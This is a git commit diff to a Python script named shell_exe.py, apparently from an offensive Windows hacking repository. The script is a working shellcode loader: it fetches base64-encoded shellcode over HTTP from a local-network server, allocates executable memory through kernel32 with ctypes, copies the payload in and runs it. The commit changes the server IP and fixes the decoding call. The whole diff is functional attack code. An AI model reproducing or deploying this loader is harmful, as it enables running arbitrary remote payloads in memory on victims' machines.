8ffd84cdf548eaf4d736b18f992d8405ffd92ed8
schecthellraiser606 <89838264+schecthellraiser606@users.noreply.github.com>
2022-07-24 00:39:14 +0900

    encrypt

--- Winhack/shell_exe.py
+++ Winhack/shell_exe.py
@@ -3,33 +3,34 @@ import base64
 import ctypes
 
 kernel32 = ctypes.windll.kernel32
-URL = "http://192.168.1.203:8000/my32shellcode.bin"
+URL = "http://192.168.5.10:8000/my32shellcode.bin"
 
 def get_code(url):
     with request.urlopen(url) as response:
-        shellcode = base64.decode(response.read())
+        shellcode = base64.decodebytes(response.read())
     return shellcode
-  
+
+
 def write_memory(buf):
     length = len(buf)
-    
+
     kernel32.VirtualAlloc.restype = ctypes.c_void_p
     kernel32.RtlMoveMemory.argtypes = (
         ctypes.c_void_p,
         ctypes.c_void_p,
-        ctypes.c_size_t
-    )
-    
+        ctypes.c_size_t)
+
     ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
     kernel32.RtlMoveMemory(ptr, buf, length)
     return ptr
-  
+
+
 def run(shellcode):
     buffer = ctypes.create_string_buffer(shellcode)
     ptr = write_memory(buffer)
     shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
     shell_func()
-    
+
 if __name__ == '__main__':
     shellcode = get_code(URL)
     run(shellcode)
